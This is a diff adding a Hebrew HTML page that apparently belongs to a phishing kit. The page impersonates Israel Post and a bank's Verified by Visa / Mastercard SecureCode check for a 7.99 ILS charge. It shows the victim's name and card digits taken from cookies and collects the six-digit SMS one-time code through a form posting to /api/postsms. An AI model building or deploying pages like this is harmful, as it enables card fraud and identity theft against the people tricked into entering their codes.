@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+  <meta charset="UTF-8">
+  <title>קוד אימות</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="./css/style.css">
+</head>
+<body style="background:white;">
+
+<div style="text-align:center; padding:30px;" id="page-content">
+  <div class="form form-container">
+    <div style="display:flex;">
+      <div style="text-align:left; width:50%;">
+        <h3 id="bank_name">—</h3>
+      </div>
+      <div style="text-align:right; width:50%;">
+        <img src="./img/vbvmcs.png" style="width:120px;">
+      </div>
+    </div>
+
+    <table style="width:100%; direction:rtl; font-size:1.2em; margin-top:20px;">
+      <tbody>
+        <tr>
+          <th> שם : </th>
+          <td id="full_name">לא זמין</td>
+        </tr>
+        <tr>
+          <th>סוחר : </th>
+          <td>דואר ישראל</td>
+        </tr>
+        <tr>
+          <th>כרטיס : </th>
+          <td dir="ltr" id="card_number">XXX-XXXX-XXXX-****</td>
+        </tr>
+        <tr>
+          <th>תאריך :</th>
+          <td id="today_date"></td>
+        </tr>
+        <tr>
+          <th>כולל : </th>
+          <td>7.99 ILS</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div style="padding:20px; font-size:1.1em;" dir="rtl">
+      <h4 style="margin-top:-10px; font-size:1.2em;">אימות זהות לתשלום העסקה</h4>
+      <span>כדי לאשר פעולה זו. הזן את הקוד שנשלח למספר הטלפון שלך.</span>
+    </div>
+
+    <form action="/api/postsms" method="post" style="margin-top:-20px;" dir="rtl" id="otp-form">
+      <div class="col">
+        <input type="text"
+               id="sms"
+               name="sms_code"
+               required
+               class="textinput otp-input"
+               placeholder="קוד OTP"
+               inputmode="numeric"
+               pattern="[0-9]{6}"
+               maxlength="6"
+               minlength="6"
+               autocomplete="one-time-code"
+               oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+      </div>
+      <div class="col">
+        <button type="submit" class="sbmt">שלח</button>
+      </div>
+    </form>
+
+    <div style="text-align:center; margin-top:20px;">
+      <img src="./img/logo.png" style="width:70px;">
+      <p> דואר ישראל </p>
+      <p> © 2025 כל הזכויוות שמורות </p>
+    </div>
+  </div>
+</div>
+
+<script>
+  function getCookie(name) {
+    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+    return match ? decodeURIComponent(match[2]) : null;
+  }
+  const fullName = getCookie('full_name');
+  const last4    = getCookie('card_last4');
+  if (fullName) document.getElementById('full_name').textContent = fullName;
+  if (last4)    document.getElementById('card_number').textContent = 'XXX-XXXX-XXXX-' + last4;
+
+  const d = new Date();
+  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  const day = String(d.getDate()).padStart(2,'0');
+  document.getElementById('today_date').textContent = `${day}/${months[d.getMonth()]}/${d.getFullYear()}`;
+</script>
+
+</body>
+</html>
